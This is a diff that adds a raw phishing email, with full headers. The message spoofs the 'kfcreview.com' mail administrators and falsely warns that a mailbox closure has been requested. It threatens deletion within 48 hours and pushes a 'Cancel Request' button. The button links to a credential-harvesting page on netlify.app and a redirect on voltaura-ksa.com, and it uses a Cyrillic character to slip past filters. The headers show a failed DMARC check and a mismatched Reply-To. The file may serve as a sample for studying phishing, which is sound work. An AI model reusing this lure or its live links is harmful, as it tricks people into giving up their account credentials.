@@ -1,0 +1,175 @@
+Return-Path: <albatroscomm@lynxsrl.it>
+Received: from [207.189.21.144] ([207.189.21.144])
+ by inbound-smtp.us-east-2.amazonaws.com with SMTP id ano0kh85ojncodosra67l8uds40a6p790u418ag1
+ for zingerpie@kfcreview.com;
+ Thu, 09 Jul 2026 19:07:20 +0000 (UTC)
+Received-SPF: none (spfCheck: 207.189.21.144 is neither permitted nor denied by domain of lynxsrl.it) client-ip=207.189.21.144; envelope-from=albatroscomm@lynxsrl.it; helo=[207.189.21.144];
+Authentication-Results: amazonses.com;
+ spf=none (spfCheck: 207.189.21.144 is neither permitted nor denied by domain of lynxsrl.it) client-ip=207.189.21.144; envelope-from=albatroscomm@lynxsrl.it; helo=[207.189.21.144];
+ dmarc=fail header.from=kfcreview.com;
+X-SES-RECEIPT: AEFBQUFBQUFBQUFHTjl5VStmRFFrVUprdDFiUnBRaHd6RDVRK0FNQ0pKMHpuVDJjNkIrSWxkMi9jd1p6ZE4xRDVNUVpmeTl0TTdjSGxJekh1Z25ldnhGaDVZWXhWeEhhY1hOZ2FWMloxY3hOeW9zNWRZN1ZBWHNuTmJDUVYrQ05QRmYzdGpmdTFqd3gzZEwzV1JuTWgwUHhjMktlNUtYQ2lrWlBnVXZuZnJXSUhaVHFaVzkrVXlZVVEzWHZJVDVKYS8rNzEzczZqRjBlTS9zUFI4ZDNpTFNKa2V2SU1jQ3NRVkFXYTMvdWxWcU1zS2Nsdm1hMzdOSkxObGRpKzFBN1llYXJVZ1hYRTc0YzNRUFlobmU2Y0xMSVFXT2tObXlOUURQR3p6V2Zzb2lEZ0psMTZGVitER2FXUU5BOUdOWFNKemNpVnl3UUNRWnM9
+X-SES-DKIM-SIGNATURE: a=rsa-sha256; q=dns/txt; b=N/Vim3EEcWD20RfoGZdMcDJjwFskkSEajfzdfyq36bXj8t6VHINayR1VabKP99K58KK5BcTpfg5SI2GN3I8qhNTwWXu0myHUb4Y8cfkMNF9nhSU6vfn+DFR/X4Xz/G89GSmIp3BVDOHdAWgoDfdu/Uje/jiOPDIFufem5CSMLOw=; c=relaxed/simple; s=kra23psoka5qyyh6gdejiiuof3nluwuz; d=amazonses.com; t=1783624040; v=1; bh=HEjSzEVH8Ch5gBVSAwuyOt1Cvp4UQ67Z63zM/4Y8FXw=; h=From:To:Cc:Bcc:Subject:Date:Message-ID:MIME-Version:Content-Type:X-SES-RECEIPT;
+Reply-To: albatroscomm@lynxsrl.it
+From: Service.kfcreview.com-Management/IMAP/POP3<zingerpie@kfcreview.com>
+To: zingerpie@kfcreview.com
+Subject: Your Attention is Needed to Retain Access Today 7/9/2026 8:07:19 p.m..!
+Date: 9 Jul 2026 20:07:19 +0100
+Message-ID: <20260709200719.35319B0D80441B62@kfcreview.com>
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+
+<html><head><meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+<meta name=3D"GENERATOR" content=3D"MSHTML 11.00.9600.18817">
+</head><body><p>&nbsp;</p>
+
+<table width=3D"640" lang=3D"en" style=3D'color: rgb(0, 0, 0); text-transfo=
+rm: none; letter-spacing: normal; font-family: "Times New Roman"; font-size=
+: 12px; font-style: normal; font-weight: 400; word-spacing: 0px; border-rig=
+ht-color: rgb(227, 227, 227); border-left-color: rgb(227, 227, 227); border=
+-right-width: 1px; border-left-width: 1px; border-right-style: solid; borde=
+r-left-style: solid; white-space: normal; border-collapse: collapse; border=
+-spacing: 0px; orphans: 2; widows: 2; background-color:=20
+rgb(255, 255, 255); font-variant-ligatures: normal; font-variant-caps: norm=
+al; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial; tex=
+t-decoration-style: initial; text-decoration-color: initial;' dir=3D"ltr" b=
+order=3D"0" cellspacing=3D"0" cellpadding=3D"0">
+	<tbody>
+		<tr style=3D"background-color: rgb(18, 124, 214);">
+			<td width=3D"1" style=3D"background: rgb(3, 100, 184); margin: 0px; padd=
+ing: 0px; border-top-color: rgb(227, 227, 227); border-top-width: 1px; bord=
+er-top-style: solid; border-collapse: collapse;">&nbsp;</td>
+			<td width=3D"24" style=3D"margin: 0px; padding: 0px; border-top-color: r=
+gb(227, 227, 227); border-bottom-color: rgb(227, 227, 227); border-top-widt=
+h: 1px; border-bottom-width: 1px; border-top-style: solid; border-bottom-st=
+yle: solid; border-collapse: collapse;">&nbsp;</td>
+			<td width=3D"310" valign=3D"middle" style=3D"margin: 0px; padding: 12px =
+0px; border-top-color: rgb(227, 227, 227); border-bottom-color: rgb(227, 22=
+7, 227); border-top-width: 1px; border-bottom-width: 1px; border-top-style:=
+ solid; border-bottom-style: solid; border-collapse: collapse;">
+			<h1 style=3D'margin: 0px auto auto; padding: 0px; color: rgb(255, 255, 2=
+55); line-height: 20pt; font-family: "Segoe UI Light"; font-size: 11pt; fon=
+t-weight: 400;'>Services (<strong>kfcreview.com)</strong> Email Management&=
+nbsp;Server&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
+p;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&=
+nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </h1>
+			</td>
+			<td width=3D"24" style=3D"margin: 0px; padding: 0px; border-top-color: r=
+gb(227, 227, 227); border-bottom-color: rgb(227, 227, 227); border-top-widt=
+h: 1px; border-bottom-width: 1px; border-top-style: solid; border-bottom-st=
+yle: solid; border-collapse: collapse;">&nbsp;</td>
+		</tr>
+	</tbody>
+</table>
+
+<p>&nbsp;</p>
+
+<table width=3D"640" lang=3D"en" style=3D'color: rgb(0, 0, 0); text-transfo=
+rm: none; letter-spacing: normal; font-family: "Times New Roman"; font-size=
+: 12px; font-style: normal; font-weight: 400; word-spacing: 0px; white-spac=
+e: normal; border-collapse: collapse; border-spacing: 0px; orphans: 2; wido=
+ws: 2; background-color: rgb(255, 255, 255); font-variant-ligatures: normal=
+; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoratio=
+n-thickness: initial; text-decoration-style: initial;=20
+text-decoration-color: initial;' dir=3D"ltr" border=3D"0" cellspacing=3D"0"=
+ cellpadding=3D"0">
+	<tbody>
+		<tr>
+			<td width=3D"1" style=3D"background: rgb(227, 227, 227); margin: 0px; pa=
+dding: 0px; border-collapse: collapse;">&nbsp;</td>
+			<td width=3D"24" style=3D"margin: 0px; padding: 0px; border-collapse: co=
+llapse;">&nbsp;</td>
+			<td width=3D"640" valign=3D"top" style=3D"margin: 0px; padding: 10px 0px=
+ 20px; border-bottom-color: rgb(227, 227, 227); border-bottom-width: 1px; b=
+order-bottom-style: solid; border-collapse: collapse;" colspan=3D"2">
+			<table style=3D"border-collapse: collapse; border-spacing: 0px;" border=
+=3D"0" cellspacing=3D"0" cellpadding=3D"0">
+				<tbody>
+					<tr>
+						<td width=3D"630" style=3D"margin: 0px; padding: 0px; line-height: 13=
+pt; font-size: 10pt; border-collapse: collapse;">
+						<table width=3D"100%" lang=3D"en" style=3D"border-collapse: collapse;=
+ border-spacing: 0px;" dir=3D"ltr" border=3D"0" cellspacing=3D"0" cellpaddi=
+ng=3D"0">
+							<tbody>
+								<tr>
+									<td style=3D"margin: 0px; padding: 0px; border-collapse: collapse;=
+">
+									<div style=3D'margin: 0px; padding: 0px; color: rgb(51, 51, 51); f=
+ont-family: "Segoe UI", Tahoma, sans-serif; font-size: 14px; border-top-wid=
+th: 0px;'>
+									<p>Dear {zingerpie / Account Holder},</p>
+
+									<p>We have received a request to permanently close the mailbox ass=
+ociated with your account </p>
+
+									<p>[Account/Mailbox ID: 3699213874].,If this request was not initi=
+ated by you, please</p>
+
+									<p>Click The Secure Link Below To Cancel&nbsp;Request Closure Imme=
+diately &amp; Rectify Issue!!</p>
+									</div>
+
+									<div style=3D'margin: 0px; padding: 0px; color: rgb(51, 51, 51); f=
+ont-family: "Segoe UI", Tahoma, sans-serif; font-size: 14px; border-top-wid=
+th: 0px;'>&nbsp;</div>
+
+									<div style=3D'margin: 0px; padding: 0px; color: rgb(51, 51, 51); f=
+ont-family: "Segoe UI", Tahoma, sans-serif; font-size: 14px;'><br style=3D'=
+color: rgb(29, 34, 40); font-family: "Segoe UI Light", serif, EmojiFont; fo=
+nt-size: 13px;'>
+									<a style=3D'background: rgb(18, 124, 214); padding: 7px; color: rg=
+b(255, 255, 255); font-family: "segoe ui light"; font-size: 15px; text-deco=
+ration-line: none;' href=3D"https://w3bmaillogoncancelrequest0markactive0.n=
+etlify.app/#zingerpie@kfcreview.com" target=3D"_blank" data-saferedirecturl=
+=3D"https://www.google.com/url?q=3Dhttp://voltaura-ksa.com/ejvhfzn/vhunsyw/=
+nexrjw1/?email=3Dzingerpie@kfcreview.com&amp;source=3Dgmail&amp;ust=3D17819=
+75452355000&amp;usg=3DAOvVaw1Ju-2nMV262mZgOsxXcAgv">Canc&#1077;l Request Fo=
+r zingerpie</a></div>
+
+									<div style=3D'margin: 0px; padding: 0px; color: rgb(51, 51, 51); f=
+ont-family: "Segoe UI", Tahoma, sans-serif; font-size: 14px;'>&nbsp;</div>
+
+									<div style=3D'margin: 0px; padding: 0px; color: rgb(51, 51, 51); f=
+ont-family: "Segoe UI", Tahoma, sans-serif; font-size: 14px;'>&nbsp;<br><br=
+></div>
+									</td>
+								</tr>
+							</tbody>
+						</table>
+
+						<p>Note: Failure to confirm within 48 hours from 7/9/2026 8:07:19 p.m=
+=2E&nbsp;will result in permanent closure&nbsp;&amp; deletion of all stored=
+ mails.<br><br>E-Mail Domain-Management</p>
+
+						<p>kfcreview.com support team.&nbsp;</p>
+						</td>
+					</tr>
+				</tbody>
+			</table>
+			</td>
+			<td width=3D"1" style=3D"margin: 0px; padding: 0px; border-collapse: col=
+lapse;">&nbsp;</td>
+			<td width=3D"1" style=3D"margin: 0px; padding: 0px; border-collapse: col=
+lapse;">&nbsp;</td>
+			<td width=3D"1" style=3D"margin: 0px; padding: 0px; border-collapse: col=
+lapse;">&nbsp;</td>
+			<td width=3D"1" valign=3D"top" style=3D"margin: 0px; padding: 0px; borde=
+r-collapse: collapse;">&nbsp;</td>
+			<td width=3D"29" style=3D"margin: 0px; padding: 0px; border-collapse: co=
+llapse;">&nbsp;</td>
+			<td width=3D"1" style=3D"background: rgb(227, 227, 227); margin: 0px; pa=
+dding: 0px; border-collapse: collapse;">&nbsp;</td>
+		</tr>
+		<tr>
+			<td width=3D"1" style=3D"background: rgb(227, 227, 227); margin: 0px; pa=
+dding: 0px; border-bottom-color: rgb(227, 227, 227); border-bottom-width: 1=
+px; border-bottom-style: solid; border-collapse: collapse;">&nbsp;</td>
+			<td width=3D"24" style=3D"margin: 0px; padding: 0px; border-bottom-color=
+: rgb(227, 227, 227); border-bottom-width: 1px; border-bottom-style: solid;=
+ border-collapse: collapse;">&nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</td>
+		</tr>
+	</tbody>
+</table>
+</body></html>
